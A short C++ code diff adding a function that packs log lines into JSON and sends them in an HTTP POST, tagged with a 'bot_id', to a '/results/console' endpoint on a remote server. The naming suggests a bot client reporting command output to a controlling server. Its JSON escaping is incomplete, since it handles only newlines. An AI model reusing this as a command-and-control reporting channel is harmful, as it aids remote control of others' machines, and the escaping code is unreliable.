@@ -557,3 +557,43 @@ void sendPing(const char *address) {
 
     close(sockfd);
 }
+
+void sendLogs(const char* serverIP, int serverPort, std::vector<std::string> logs, int bot_id) {
+    // Convert logs to a JSON array
+    std::string logsJson = "[";
+
+    for (const std::string& log : logs) {
+        // Escape special characters in each log entry
+        std::string escapedLog = log;
+        size_t pos = 0;
+        while ((pos = escapedLog.find("\n", pos)) != std::string::npos) {
+            escapedLog.replace(pos, 1, "\\n");
+            pos += 2; // Move past the replaced characters
+        }
+
+        logsJson += "\"" + escapedLog + "\",";
+    }
+
+    if (!logs.empty()) {
+        logsJson.pop_back(); // Remove the trailing comma
+    }
+
+    logsJson += "]";
+
+    // Construct the JSON object with the desired structure
+    std::string jsonBody = "{\"output\": " + logsJson + "}";;
+
+    // Construct the query string
+    std::string queryParams = "bot_id=" + std::to_string(bot_id);
+
+    // Create the HTTP request POST method
+    std::string httpRequest = "POST /results/console?" + queryParams + " HTTP/1.1\r\n"
+        "Host: " + std::string(serverIP) + "\r\n"
+        "Connection: close\r\n"
+        "Content-Type: application/json\r\n"
+        "Content-Length: " + std::to_string(jsonBody.size()) + "\r\n"
+        "\r\n" + jsonBody;
+
+    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest);
+    return;
+}
